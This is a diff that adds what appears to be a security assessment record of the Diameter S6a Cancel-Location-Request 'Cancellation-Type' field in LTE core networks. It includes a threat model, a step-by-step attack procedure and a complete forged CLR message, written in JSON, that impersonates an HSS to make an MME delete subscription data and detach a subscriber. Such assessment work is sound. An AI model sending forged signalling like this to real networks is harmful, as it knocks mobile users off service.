@@ -1,0 +1,124 @@
+**Threat Model:**
+
+- **Attack Assumption:**
+  - On S6a, `Cancel-Location-Request (CLR)` is sent from **HSS to MME**. Under the fixed threat model, the attacker impersonates an **HSS** and sends a forged but protocol-plausible CLR to a publicly exposed **MME** over an unauthenticated Diameter connection.
+  - The attacker knows the target subscriber IMSI and the Diameter identity of the target MME.
+  - The MME accepts the CLR and processes `Cancellation-Type` as defined in TS 29.272.
+
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the victim MME, send crafted CLR requests, and receive the corresponding CLA answers.
+  - The attacker cannot interfere with legitimate HSS<->MME traffic, cannot act as a real serving node, and has no radio or bearer-plane control.
+  - The attack is limited to effects the MME will perform locally or trigger downstream as a consequence of processing the forged CLR.
+
+**Exploitability Analysis:**
+
+`Cancellation-Type` is a **mandatory top-level Enumerated AVP** in CLR on S6a. It is processed directly by the **receiving MME** and is not mere metadata. Per the supplied protocol evidence, TS 29.272 requires the MME, after identifying the subscriber via `User-Name`, to **check `Cancellation-Type` and act accordingly**.
+
+This makes the field independently security-relevant. The enclosing CLR procedure is already sensitive, but the **specific value** of `Cancellation-Type` determines which destructive branch the MME executes:
+
+- `SUBSCRIPTION_WITHDRAWAL (2)` causes the MME to **delete subscription data** and **detach the UE**. Per TS 23.401, this can lead to **NAS Detach Request**, paging if needed, and teardown of active session state.
+- `INITIAL_ATTACH_PROCEDURE (4)` explicitly **does not delete subscription data**, but can clear SMS registration state and drive old-context cleanup.
+- `MME_UPDATE_PROCEDURE (0)` and related update causes drive **old serving/MM/bearer context removal** and release of old Serving GW resources.
+
+So the field is not simply describing why a generic cancellation happened; it is the **authoritative selector of the receiver's cleanup/detach behavior**. Changing only this AVP changes whether the MME performs:
+- full detach plus subscription-data deletion,
+- narrower mobility cleanup,
+- or SMS-registration state changes without subscription deletion.
+
+That is a distinct, field-attributable security effect.
+
+The strongest field-specific abuse under the threat model is to set:
+
+- `Cancellation-Type = SUBSCRIPTION_WITHDRAWAL (2)`
+
+Because that value selects the most disruptive standards-defined path: deletion of subscription data in the MME and UE detach. This is broader and more persistent than the update or initial-attach variants. The resulting denial of service persists until later legitimate attach/location-update procedures rebuild state, and recovery is not immediate.
+
+This satisfies the exploitability threshold because:
+1. the attacker can send a forged CLR under the fixed model;
+2. the MME normatively processes `Cancellation-Type`;
+3. the value alters stored per-subscriber state and later behavior;
+4. the resulting detach/subscription-data deletion is concrete, harmful, and specifically caused by the chosen field value.
+
+**Attack Procedure:**
+
+1. Establish a Diameter connection to the exposed MME while impersonating the HSS role.
+2. Send a minimal but coherent **CLR request** for a subscriber IMSI currently known to that MME.
+3. Include only mandatory and coherence-related AVPs:
+   - `Session-Id`
+   - `Auth-Session-State`
+   - `Origin-Host`
+   - `Origin-Realm`
+   - `Destination-Host`
+   - `Destination-Realm`
+   - `User-Name`
+   - `Cancellation-Type`
+   - optionally `Vendor-Specific-Application-Id` for plausibility
+4. Set the target field:
+   - `Cancellation-Type = SUBSCRIPTION_WITHDRAWAL (2)`
+5. Expected success condition:
+   - the MME accepts the CLR and returns a successful CLA;
+   - if the IMSI is known, the MME processes the subscription-withdrawal branch, deleting subscriber data from the MME context and detaching the UE, with possible downstream NAS detach and session teardown behavior.
+
+Only mandatory/coherence-related fields are included below; unrelated optional AVPs are excluded.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 317,
+    "application_id": 16777251,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "hss01.example.net;1735689600;clr-001"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss01.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "mme01.epc.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "epc.example.net"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    },
+    {
+      "avp_name": "Cancellation-Type",
+      "avp_value": 2
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
